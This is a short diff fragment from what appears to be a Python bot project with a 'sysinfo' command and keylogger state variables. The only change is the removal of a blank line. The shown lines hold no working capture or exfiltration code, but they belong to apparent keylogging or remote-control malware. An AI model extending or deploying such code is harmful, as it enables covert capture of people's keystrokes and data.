@@ -49,7 +49,6 @@ async def sysinfo(ctx):
 
 keylogger_running = False
 keylogger_thread = None
-
 def start_keylogger():
     global keylogger_running
     keylogger_running = True
